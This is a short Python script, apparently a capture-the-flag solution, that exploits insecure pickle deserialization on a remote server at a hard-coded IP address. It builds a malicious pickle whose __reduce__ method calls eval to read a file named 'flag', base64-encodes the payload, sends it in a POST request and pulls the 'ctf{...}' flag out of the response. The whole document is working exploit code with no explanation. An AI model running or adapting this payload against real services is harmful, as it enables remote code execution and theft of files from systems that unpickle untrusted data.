import pickle
import base64
import os
import string
import requests
import time
class Exploit(object):
    def __reduce__(self):
     return (eval, ('eval(open("flag","r").read())',))
def sendPayload(p):
    newp = base64.urlsafe_b64encode(p).decode()
    headers = {'Content-Type':'application/yakoo'}
    r =requests.post("http://34.89.213.64:30818/",headers=headers,data=newp)
    return r.text
payload_dec = pickle.dumps(Exploit(), protocol=2)
print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] + "}")